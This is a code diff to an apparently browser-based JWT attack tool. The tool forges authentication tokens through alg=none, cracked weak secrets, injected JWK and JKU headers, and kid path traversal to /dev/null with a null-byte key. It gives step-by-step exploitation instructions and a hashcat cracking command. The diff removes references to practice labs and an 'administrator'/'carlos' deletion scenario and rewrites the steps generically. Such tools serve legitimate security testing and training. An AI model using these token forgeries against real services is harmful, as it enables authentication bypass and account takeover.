@@ -71,13 +71,13 @@ async function generateJwkAttackToken(forceJwkSign) {
     let notes = [];
 
     if (selectedAttack === 'unverified-signature') {
-      notes = ['Lab: JWT authentication bypass via unverified signature.'];
+      notes = ['Unverified signature candidate generated.'];
     }
 
     if (selectedAttack === 'flawed-signature') {
       nextHeader.alg = 'none';
       nextSig = '';
-      notes = ['Lab: JWT authentication bypass via flawed signature verification (alg=none).'];
+      notes = ['alg=none candidate generated.'];
     }
 
     if (selectedAttack === 'weak-signing-key') {
@@ -110,7 +110,7 @@ async function generateJwkAttackToken(forceJwkSign) {
       nextSig = await signWithMaterial(signingInput, alg, generatedJwkMaterial);
 
       notes = [
-        `Lab: JWT authentication bypass via jwk header injection (${alg}).`,
+        `JWK header injection candidate (${alg}).`,
         'Auto flow: key generated -> public JWK embedded -> token signed automatically.',
       ];
     }
@@ -135,24 +135,29 @@ async function generateJwkAttackToken(forceJwkSign) {
 
       jwksOutput.value = JSON.stringify({ keys: [minimalPublicJwk(generatedJkuMaterial.publicJwk)] }, null, 2);
       notes = [
-        'Lab: JWT authentication bypass via jku header injection.',
+        'JKU header injection candidate generated.',
         `Signed with generated RSA key and kid=${kid}.`,
-        'Upload JWKS JSON to your exploit server and set jku to that URL.',
+        'Host JWKS JSON at your URL and use that URL in jku.',
       ];
     }
 
     if (selectedAttack === 'kid-path-traversal') {
-      // Automated traversal kid + null-byte signing key, while preserving source alg/payload.
       const selectedAlg = kidAlgSelect.value;
-      if (!selectedAlg.startsWith('HS')) throw new Error('kid traversal signer supports HS algorithms only.');
       nextHeader.alg = selectedAlg;
       nextHeader.kid = '../../../../../../../dev/null';
       delete nextHeader.jku;
       delete nextHeader.jwk;
+
       const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-      nextSig = await hmacSignBase64urlBytes(signingInput, new Uint8Array([0]), hashFromAlg(selectedAlg));
+      if (selectedAlg.startsWith('HS')) {
+        nextSig = await hmacSignBase64urlBytes(signingInput, new Uint8Array([0]), hashFromAlg(selectedAlg));
+      } else {
+        const material = await generateKeyMaterialForAlg(selectedAlg);
+        nextSig = await signWithMaterial(signingInput, selectedAlg, material);
+      }
+
       resultToken.value = `${signingInput}.${nextSig}`;
-      attackNotes.textContent = 'Auto-generated kid path traversal JWT (kid=/dev/null traversal, key=0x00; payload/alg preserved).';
+      attackNotes.textContent = `Auto-generated kid path traversal JWT (alg=${selectedAlg}, kid=/dev/null traversal).`;
       return;
     }
 
@@ -241,45 +246,43 @@ function getAttackSteps(key) {
   if (key === 'jku-header-injection') {
     return [
       '1) Paste source JWT and click Decode token.',
-      '2) In payload editor set sub claim to administrator.',
-      '3) In Attack-specific input paste your exploit server JWKS URL (jku).',
+      '2) Edit payload as needed for your test case.',
+      '3) In Attack-specific input paste your JWKS URL (jku).',
       '4) Click Generate RSA key for JKU to create key + kid + JWKS JSON.',
-      '5) Click Copy JWKS JSON and upload it to your exploit server at that URL.',
+      '5) Click Copy JWKS JSON and upload it to your server at that URL.',
       '6) Click Sign JKU token now (or Generate) to sign JWT with generated private key.',
-      '7) Send request with this token to /admin, then call /admin/delete?username=carlos.',
+      '7) Send request with generated token and validate behavior.',
     ].join('\n');
   }
 
   if (key === 'jwk-header-injection') {
     return [
       '1) Paste source JWT and click Decode token.',
-      '2) In payload editor set sub claim to administrator.',
+      '2) Edit payload as needed for your test case.',
       '3) Choose algorithm and click Generate key for selected alg.',
       '4) Click Embed JWK & Sign token.',
-      '5) Send request with generated token.',
+      '5) Send request with generated token and validate behavior.',
     ].join('\n');
   }
 
   if (key === 'weak-signing-key') {
     return [
       '1) Paste source JWT and click Decode token.',
-      '2) In payload editor set sub claim to administrator.',
+      '2) Edit payload as needed for your test case.',
       '3) Try cracking the secret using Hashcat:',
       '   hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list',
       '4) Put cracked secret into Signing key input and click Generate.',
-      '5) Send request with generated token.',
+      '5) Send request with generated token and validate behavior.',
     ].join('\n');
   }
 
   if (key === 'kid-path-traversal') {
     return [
       '1) Paste source JWT and click Decode token.',
-      '2) Optionally edit payload (for example set sub=administrator).',
-      '3) In Attack-specific input choose signing alg (HS256/HS384/HS512).',
-      '4) Tool sets kid to ../../../../../../../dev/null.',
-      '5) Tool signs with null-byte key (0x00) using selected alg.',
-      '6) Click Generate and send request to /admin.',
-      '7) Then call /admin/delete?username=carlos.',
+      '2) Optionally edit payload for your test case.',
+      '3) Choose signing algorithm in Attack-specific input.',
+      '4) Tool sets kid to ../../../../../../../dev/null automatically.',
+      '5) Click Generate and test generated token.',
     ].join('\n');
   }
 
@@ -293,7 +296,7 @@ function getPresetHint(key) {
     'weak-signing-key': 'Requires user-provided secret.',
     'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
     'jku-header-injection': 'Requires jku URL.',
-    'kid-path-traversal': 'Choose HS alg, then Generate for ready JWT.',
+    'kid-path-traversal': 'Choose algorithm and click Generate.',
   };
   return hints[key] || 'Choose preset and generate.';
 }
